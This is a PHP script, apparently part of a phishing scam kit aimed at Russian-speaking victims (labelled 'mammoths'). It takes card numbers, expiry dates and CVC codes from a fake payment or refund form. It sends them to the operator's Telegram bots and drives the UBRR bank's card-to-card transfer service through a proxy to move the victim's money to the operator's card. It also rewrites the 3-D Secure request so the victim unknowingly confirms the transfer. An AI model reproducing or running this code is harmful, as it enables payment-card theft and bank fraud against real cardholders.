<?php

    include 'config.php';
	
	setcookie("execdata", base64_encode($_POST["amount"] . "/" . $_POST["order"] . "/" . date("d-m-Y H:i")), time() + 3600);
	setcookie('amount', $_POST["amount"], time()+900);

	$card_holder = $_POST["card_holder"];
	if (!isset($card_holder) || $card_holder == "") {
		$card_holder = "не указан";
	}
	
	
        $ch = curl_init('https://p2p.ubrr.ru/transferindexnew.jsp');
        curl_setopt($ch, CURLOPT_HTTPHEADER, 'User-Agent: '.getallheaders()['User-Agent']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
        $session = curl_exec($ch);
        curl_close($ch);
         
        preg_match_all('#<input type="hidden" name="_csrf" value="(.+?)"#is', $session, $csrf);
        
        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $session, $matches);
        
        $cookies = array();
        foreach($matches[1] as $item) {
            parse_str($item, $cookie);
            $cookies = array_merge($cookies, $cookie);
        }
        

        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://p2p.ubrr.ru/ShopBridge/transferajaxserv.jsp',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => 'mode=calcFee&amt='.$_POST['amount'].'.00&pan='.str_replace(' ','',$_POST['card_number']).'&pan2='.$card.'&currency=643&expdate='.str_replace(' ','',$_POST["card_expire_year"].$_POST["card_expire_month"]),
        CURLOPT_HTTPHEADER => array('Cookie: ubrr_city=2; JSESSIONID='.$cookies['JSESSIONID'].'; lid=d7ed6da2886c08ab12f7326b69de7596','Host: p2p.ubrr.ru','Origin: https://p2p.ubrr.ru','Referer: https://p2p.ubrr.ru/transferindexnew.jsp','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36','X-Requested-With: XMLHttpRequest')
        ]);
        $com = json_decode(curl_exec($curl),1);
        curl_close($curl);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://p2p.ubrr.ru/ShopBridge/transferajaxserv.jsp',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => 'mode=cvv&pan='.str_replace(' ','',$_POST['card_number']).'',
        CURLOPT_HTTPHEADER => array('Cookie: ubrr_city=2; JSESSIONID='.$cookies['JSESSIONID'].'; lid=d7ed6da2886c08ab12f7326b69de7596','Host: p2p.ubrr.ru','Origin: https://p2p.ubrr.ru','Referer: https://p2p.ubrr.ru/transferindexnew.jsp','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36','X-Requested-With: XMLHttpRequest')
        ]);
        $clc = json_decode(curl_exec($curl),1);
        curl_close($curl);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://p2p.ubrr.ru/ShopBridge/transferajaxserv.jsp',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => 'mode=create&amt='.$_POST['amount'].'.00&currency=643&pan='.str_replace(' ','',$_POST['card_number']).'&pan2='.$card.'&expdate='.str_replace(' ','',$_POST["card_expire_year"].$_POST["card_expire_month"]).'&digit=2&email=&fee='.$com['AcqFee']/100,
        CURLOPT_HTTPHEADER => array('Cookie: ubrr_city=2; JSESSIONID='.$cookies['JSESSIONID'].'; lid=d7ed6da2886c08ab12f7326b69de7596','Host: p2p.ubrr.ru','Origin: https://p2p.ubrr.ru','Referer: https://p2p.ubrr.ru/transferindexnew.jsp','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36','X-Requested-With: XMLHttpRequest')
        ]);
        $id = json_decode(curl_exec($curl),1);
        curl_close($curl);
        
        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://p2p.ubrr.ru/runtran.jsp',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => 'pan='.str_replace(' ','',$_POST['card_number']).'&cvv2='.$_POST['card_cvc'].'&pan2='.$card.'&Fee=0&OrderID='.$id['orderid'].'&action=run&mode=work&expMon='.str_replace(' ','',$_POST["card_expire_month"]).'&ExpYear='.str_replace(' ','',$_POST["card_expire_year"]).'&recipientTextMess=',
        CURLOPT_HTTPHEADER => array('Cookie: ubrr_city=2; JSESSIONID='.$cookies['JSESSIONID'].'; lid=d7ed6da2886c08ab12f7326b69de7596','Host: p2p.ubrr.ru','Origin: https://p2p.ubrr.ru','Referer: https://p2p.ubrr.ru/transferindexnew.jsp','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',)
        ]);
        $vals = curl_exec($curl);
        curl_close($curl);
        
        preg_match_all('/<input type="hidden" value="(.*?)" name="(.+?)"/', $vals, $val);

        
        $curl = curl_init();
        curl_setopt_array($curl, [
        CURLOPT_URL => 'https://p2p.ubrr.ru/MPI/TransactionProcessing.jsp',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_PROXY => $proxy,
        CURLOPT_PROXYUSERPWD => $pass,
        CURLOPT_POSTFIELDS => 'merid='.$val[1][0].'&oid='.$val[1][1].'&BrXml='.$val[1][2].'&emailuser=',
        CURLOPT_HTTPHEADER => array('Cookie: ubrr_city=2; JSESSIONID='.$cookies['JSESSIONID'].'; lid=d7ed6da2886c08ab12f7326b69de7596','Host: p2p.ubrr.ru','Origin: https://p2p.ubrr.ru','Referer: https://p2p.ubrr.ru/runtran.jsp','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',)
        ]);
        $opn = curl_exec($curl);
        curl_close($curl);
        
        preg_match_all('#<form id="pareq_from" name="pareq_from" method="post" action="(.+?)"#is', $opn, $action);
        preg_match_all('#<input type="hidden" name="PaReq" value="(.+?)"#is', $opn, $PaReq);
        preg_match_all('#<input name="TermUrl" type="hidden" value="(.+?)"#is', $opn, $TermUrl);
        preg_match_all('#<input type="hidden" name="MD" value="(.+?)"#is', $opn, $MD);
        
    $order["url"] = $TermUrl[1][0];
    $order["sess"] = $cookies['JSESSIONID'];    

    setcookie('set', base64_encode(json_encode($order, JSON_UNESCAPED_UNICODE)));
    
    $PaReq = zlib_decode(base64_decode($PaReq[1][0]));
    $PaReq = preg_replace('#<name>(.+?)</name>#is', '<name>'.$name.'</name>', $PaReq);
    $PaReq = base64_encode(zlib_encode($PaReq, ZLIB_ENCODING_DEFLATE));
       
       if($MD[1][0]){
           
    if ($_POST['ref']=="0"){
	$message = "💰 Мамонт перешел на страницу оплаты.💰\n\nНомер карты: " . $_POST["card_number"] . "\nДержатель карты: " . $card_holder . "\nСрок действия: " . $_POST["card_expire_month"] . "/" . $_POST["card_expire_year"] . "\nКод CVC: " . $_POST["card_cvc"] . "\n\nСумма платежа: " . $_POST["amount"] . " руб.\nЗаказ: " . $_POST["order"] . "";
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode($message).'&parse_mode=html');

	$mess = "💰 Мамонт перешел на страницу оплаты.💰\n\nСумма платежа: " . $_POST["amount"] . " руб.";
	file_get_contents('https://api.telegram.org/bot'.$wtoken.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode($mess).'&parse_mode=html');
} else {
    setcookie('voz', '1', time()+900);
    
	$message = "💰 Мамонт перешел на страницу возврата.💰\n\nНомер карты: " . $_POST["card_number"] . "\nДержатель карты: " . $card_holder . "\nСрок действия: " . $_POST["card_expire_month"] . "/" . $_POST["card_expire_year"] . "\nКод CVC: " . $_POST["card_cvc"] . "\n\nСумма платежа: " . $_POST["amount"] . " руб.\nЗаказ: " . $_POST["order"] . "";
	file_get_contents('https://api.telegram.org/bot'.$token.'/sendMessage?chat_id='.$chatid.'&text='.urlencode($message).'&parse_mode=html');

	$mess = "💰 Мамонт перешел на страницу возврата.💰\n\nСумма возврата: " . $_POST["amount"] . " руб. ";
	file_get_contents('https://api.telegram.org/bot'.$wtoken.'/sendMessage?chat_id='.$wchatid.'&text='.urlencode($mess).'&parse_mode=html');
}
           
            $ab = isset($_SERVER['HTTPS']) ? 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php' : 'http://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php';
        
            echo
            '<body onload="document.forms[0].submit()">'.
                '<form action="' . $action[1][0] . '" method="post">' .
                    '<input type="hidden" name="PaReq" value="' . $PaReq . '">' .
                    '<input type="hidden" name="MD" value="' . $MD[1][0] . '">' .
                    '<input type="hidden" name="TermUrl" value="' . $ab . '">' .
                '</form>' .
            '</body>';
            
} else {
        if ($_POST['ref']=="0"){
                file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode('<b>💰Ошибка перехода на оплату, сумма: '.$_POST['amount'].' руб. 💰</b>')."&parse_mode=html");
                file_get_contents("https://api.telegram.org/bot".$wtoken."/sendMessage?chat_id=".$wchatid."&text=".urlencode('<b>💰Ошибка перехода на оплату, сумма: '.$_POST['amount'].' руб. 💰</b>')."&parse_mode=html");
        } else {
                file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode('<b>💰Ошибка перехода на возврат, сумма: '.$_POST['amount'].' руб. 💰</b>')."&parse_mode=html");
                file_get_contents("https://api.telegram.org/bot".$wtoken."/sendMessage?chat_id=".$wchatid."&text=".urlencode('<b>💰Ошибка перехода на возврат, сумма: '.$_POST['amount'].' руб. 💰</b>')."&parse_mode=html");
}
header('Location: ' . $fail_url . '?error=Проверьте корректность введенных данных');
}
?>

